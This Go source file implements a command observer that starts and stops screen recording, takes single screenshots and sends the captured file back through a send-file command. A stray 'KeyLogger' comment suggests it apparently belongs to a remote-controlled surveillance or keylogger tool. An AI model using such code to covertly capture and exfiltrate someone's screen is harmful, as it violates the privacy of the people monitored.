package internal

import (
	"log"
)

// KeyLogger commands Observer
type ScreenshotCmdObserver struct {
	recorder         *ScreenRecorder
	recordingChannel chan *Screenshot
	sendShotCmd      *SendFileCommand
}

func (o *ScreenshotCmdObserver) execute(cmd string, data []string) {
	if cmd != "screen" {
		return
	}

	log.Println("ScreenshotCmdObserver: new action triggered")

	// This commands needs data to operate
	if len(data) <= 0 {
		return
	}

	action := data[0]

	switch action {
	// Recording screen operations
	case "record":
		if len(data) <= 1 {
			return
		}

		actioncmd := data[1]

		switch actioncmd {
		case "start":
			// Starts recording in a folder
			o.startRecording()
			return
		case "stop":
			// Stops recording
			o.stopRecording()
			return
		}

		break

	// Take only one shot
	case "shot":
		o.shot()
		break
	}

}

func (o *ScreenshotCmdObserver) startRecording() {
	o.recordingChannel = make(chan *Screenshot)

	go func() {
		o.recorder.StartCapturing(o.recordingChannel)

		for {
			shot := <-o.recordingChannel
			log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
		}
	}()
}

func (o *ScreenshotCmdObserver) stopRecording() {
	o.recorder.StopCapturing()
}

func (o *ScreenshotCmdObserver) shot() {
	// Set 'tmp' as group for the folder
	shot := o.recorder.ScreenShot("tmp")
	filepath := shot.FilePath
	_ = filepath

	// TODO: send the file back
	o.sendShotCmd.Send(filepath)
}

func NewScreenshotCmdObserver(recorder *ScreenRecorder, sendShotCmd *SendFileCommand) *ScreenshotCmdObserver {
	return &ScreenshotCmdObserver{
		recorder:    recorder,
		sendShotCmd: sendShotCmd,
	}
}
